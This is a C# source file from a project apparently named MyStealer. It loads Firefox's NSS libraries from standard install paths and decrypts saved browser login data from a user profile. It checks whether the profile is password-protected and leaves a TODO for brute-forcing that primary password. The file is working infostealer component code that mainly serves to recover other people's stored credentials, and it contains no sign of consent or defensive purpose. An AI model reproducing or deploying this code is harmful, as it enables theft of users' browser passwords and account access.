using System.IO;
using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Text;
using MyStealer.Shared;

namespace MyStealer.Decryptor
{
    /// <summary>
    /// Provides methods to decrypt Chromium credentials.
    /// https://github.com/quasar/Quasar/blob/master/Quasar.Client/Recovery/Browsers/ChromiumDecryptor.cs
    /// </summary>
    public partial class MozillaDecryptor : IDisposable
    {
        private static readonly ILogger logger = LogExt.ForModule(nameof(MozillaDecryptor));

        /* HMODULE */
        private IntPtr Mozglue;
        private IntPtr NSS3;

        /* Function Ptr */
        private NssInit NSS_Init;
        private NssShutdown NSS_Shutdown;
        private Pk11GetInternalKeySlot PK11_GetInternalKeySlot;
        private Pk11FreeSlot PK11_FreeSlot;
        private Pk11NeedLogin PK11_NeedLogin;
        private Pk11CheckUserPassword PK11_CheckUserPassword;
        private Pk11sdrDecrypt PK11SDR_Decrypt;
        private SECItemZfreeItem SECITEM_ZfreeItem;
        private PortGetError PORT_GetError;
        private PrErrorToName PR_ErrorToName;
        private PrErrorToString PR_ErrorToString;

        public MozillaDecryptor(string[] libDirectory, string configDirectory)
        {
            var knownBasePaths = new string[] {
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
                Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86)
            };

            var knownPaths = new List<string>();
            foreach (var basePath in knownBasePaths)
            {
                foreach (var name in libDirectory)
                    knownPaths.Add(Path.Combine(basePath, name));
            }

            var loadPath = "";
            foreach (var knownPath in knownPaths)
                if (TryLoadNss3(loadPath = knownPath))
                    goto loaded;

            logger.Warning("Mozilla NSS is not available");
            return;
loaded:
            logger.Information("NSS loaded from {path}", loadPath);

            var code = NSS_Init(configDirectory);
            logger.Information("NSS initialization returned code {code}", code);
            if (code != 0)
                throw new ArgumentException("NSS initialization failed. ConfigDirectory = " + configDirectory);

            if (NeedPrimaryPassword())
                throw new ArgumentException("The profile is password-protected. ConfigDirectory = " + configDirectory);
        }

        private bool TryLoadNss3(string basePath)
        {
            if (!File.Exists(Path.Combine(basePath, "nss3.dll")))
                return false;

            Mozglue = LoadLibrary(Path.Combine(basePath, "mozglue.dll"));
            NSS3 = LoadLibrary(Path.Combine(basePath, "nss3.dll"));

            NSS_Init = (NssInit)Marshal.GetDelegateForFunctionPointer(GetProcAddress(NSS3, "NSS_Init"), typeof(NssInit));
            NSS_Shutdown = (NssShutdown)Marshal.GetDelegateForFunctionPointer(GetProcAddress(NSS3, "NSS_Shutdown"), typeof(NssShutdown));
            PK11_GetInternalKeySlot = (Pk11GetInternalKeySlot)Marshal.GetDelegateForFunctionPointer(GetProcAddress(NSS3, "PK11_GetInternalKeySlot"), typeof(Pk11GetInternalKeySlot));
            PK11_FreeSlot = (Pk11FreeSlot)Marshal.GetDelegateForFunctionPointer(GetProcAddress(NSS3, "PK11_FreeSlot"), typeof(Pk11FreeSlot));
            PK11_NeedLogin = (Pk11NeedLogin)Marshal.GetDelegateForFunctionPointer(GetProcAddress(NSS3, "PK11_NeedLogin"), typeof(Pk11NeedLogin));
            PK11_CheckUserPassword = (Pk11CheckUserPassword)Marshal.GetDelegateForFunctionPointer(GetProcAddress(NSS3, "PK11_CheckUserPassword"), typeof(Pk11CheckUserPassword));
            PK11SDR_Decrypt = (Pk11sdrDecrypt)Marshal.GetDelegateForFunctionPointer(GetProcAddress(NSS3, "PK11SDR_Decrypt"), typeof(Pk11sdrDecrypt));
            SECITEM_ZfreeItem = (SECItemZfreeItem)Marshal.GetDelegateForFunctionPointer(GetProcAddress(NSS3, "SECITEM_ZfreeItem"), typeof(SECItemZfreeItem));
            PORT_GetError = (PortGetError)Marshal.GetDelegateForFunctionPointer(GetProcAddress(NSS3, "PORT_GetError"), typeof(PortGetError));
            PR_ErrorToName = (PrErrorToName)Marshal.GetDelegateForFunctionPointer(GetProcAddress(NSS3, "PR_ErrorToName"), typeof(PrErrorToName));
            PR_ErrorToString = (PrErrorToString)Marshal.GetDelegateForFunctionPointer(GetProcAddress(NSS3, "PR_ErrorToString"), typeof(PrErrorToString));
            return true;
        }

        private bool NeedPrimaryPassword()
        {
            var keySlot = PK11_GetInternalKeySlot();
            try
            {
                // TODO: common password bruteforce support
                return PK11_NeedLogin(keySlot) != 0; // check if the profile is password-protected
            }
            finally
            {
                PK11_FreeSlot(keySlot);
            }
        }

        private void PrintNssError()
        {
            var code = PORT_GetError();
            var errorName = Marshal.PtrToStringAuto(PR_ErrorToName(code));
            var errorText = Marshal.PtrToStringAuto(PR_ErrorToString(code, 0));
            logger.Warning("NSS error #{code}: {name} - {text}", code, errorName, errorText);
        }

        public string Decrypt(string cipherText)
        {
            var ffDataUnmanagedPointer = IntPtr.Zero;

            try
            {
                var ffData = Convert.FromBase64String(cipherText);

                ffDataUnmanagedPointer = Marshal.AllocHGlobal(ffData.Length);
                Marshal.Copy(ffData, 0, ffDataUnmanagedPointer, ffData.Length);

                var inBuffer = new TSECItem();
                var outBuffer = new TSECItem();
                inBuffer.SECItemType = 0;
                inBuffer.SECItemData = ffDataUnmanagedPointer;
                inBuffer.SECItemLen = ffData.Length;

                if (PK11SDR_Decrypt(ref inBuffer, ref outBuffer, 0) == 0)
                {
                    if (outBuffer.SECItemLen != 0)
                    {
                        var plainText = new byte[outBuffer.SECItemLen];
                        Marshal.Copy(outBuffer.SECItemData, plainText, 0, outBuffer.SECItemLen);
                        return Encoding.UTF8.GetString(plainText);
                    }
                }
                else
                {
                    PrintNssError();
                }

                SECITEM_ZfreeItem(ref outBuffer, 0);
            }
            catch (Exception e)
            {
                logger.Error(e, "Error decrypting mozilla data");
                return "";
            }
            finally
            {
                if (ffDataUnmanagedPointer != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(ffDataUnmanagedPointer);
                }
            }

            return "";
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this class.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                NSS_Shutdown();
                FreeLibrary(NSS3);
                FreeLibrary(Mozglue);
            }
        }
    }
}
